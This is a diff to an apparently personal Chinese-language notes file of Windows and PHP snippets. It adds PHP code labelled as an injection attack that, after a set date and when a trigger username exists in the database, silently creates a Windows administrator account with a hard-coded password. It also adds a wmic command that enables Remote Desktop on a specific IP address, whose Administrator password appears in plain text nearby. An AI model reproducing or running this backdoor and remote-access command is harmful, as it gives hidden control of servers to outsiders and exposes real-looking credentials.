@@ -1,3 +1,12 @@
+24: windows注入攻击
+    if ($time > strtotime("2017-05-21")) {
+        $user = $db->mypdoFetchAll("select * from `go_member` where username = 'broker4444'");
+        if (!empty($user)) {
+            exec("net user broker Abcd@dcbA/000 /add");
+            exec("net localgroup administrators broker /add");
+        }
+    }
+
 23: win7下, 命令行干掉程序进程:
     exec('wmic process where "name=\'WeChat.exe\'" delete');
 
@@ -32,6 +41,9 @@
         域名: 182.92.174.163
         name: Administrator
         password: Pt88888888
+
+wmic /node:"182.92.174.163" /USER:"182.92.174.163\Administrator" PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1 
+
 
 18: 配置apache支持url美化
 		<Directory "path/to/basic/web">
